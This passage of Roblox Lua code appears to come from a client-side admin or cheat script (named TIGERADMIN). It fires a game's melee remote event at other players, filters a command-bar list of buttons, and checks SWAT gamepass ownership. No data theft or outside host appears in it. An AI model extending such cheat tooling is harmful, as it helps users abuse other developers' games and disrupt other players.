			if enemyHum then
				local targetply = game:GetService("Players"):GetPlayerFromCharacter(hit.Parent)
				if targetply then
					if plr.TeamColor ~= targetply.TeamColor or plr.TeamColor ~= BrickColor.new("Bright blue") then
						game:GetService("ReplicatedStorage"):WaitForChild("meleeEvent"):FireServer(targetply)
						plr.Character.Head:WaitForChild("punchSound").Pitch = 1+math.random(-3,3)/10
						plr.Character.Head:WaitForChild("punchSound"):Play()
						game:GetService("ReplicatedStorage"):WaitForChild("SoundEvent"):FireServer(plr.Character.Head:WaitForChild("punchSound"))
					end
				end
			end
		end)
	end
end)
Update_Loading_Percent(85)
--// Gui
local layout = {}
for i,v in pairs(CommandsList:GetChildren()) do
	if v and v:IsA("TextButton") then
		table.insert(layout,v)
	end
end

CommandBar.Changed:Connect(function(Changed)
	if Changed:lower() == "text"  then
		CommandsList.CanvasPosition = Vector2.new(0, 0)
		if #CommandBar.Text >0 then
			for i,v in pairs(CommandsList:GetChildren()) do
				if v:IsA("TextButton") then
					if not string.lower(v:FindFirstChildOfClass("TextLabel").Text):match(string.lower(CommandBar.Text:split(" ")[1])) then
						v.Parent = TIGERADMIN
						v.Visible = false
					end
				end
			end
			for i,v in pairs(TIGERADMIN:GetChildren()) do
				if v.Name == "TEMP_COMMAND" then
					if string.lower(v:FindFirstChildOfClass("TextLabel").Text):match(string.lower(CommandBar.Text:split(" ")[1])) then
						v.Parent = CommandsList
						v.Visible = true
					end
				end
			end
		elseif #CommandBar.Text <1 then
			for i,v in pairs(layout) do
				v.Parent = TIGERADMIN
				v.Visible = false

			end
			task.wait()
			for i,v in pairs(layout) do
				if v then
					v.Parent = CommandsList
					v.Visible = true
				end
			end
		end
	end
end)
task.spawn(function()
	local Success, Error = pcall(function()
		OwnsSWAT = game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 643697197) or game:GetService("MarketplaceService"):UserOwnsGamePassAsync(plr.UserId, 96651)
	end)
	if not Success and Error then
		API.Notif("Error occurred while seeing if you own SWAT gamepass.\nIs Roblox's API having a heart attack?")
		print(Error)
	end
end)
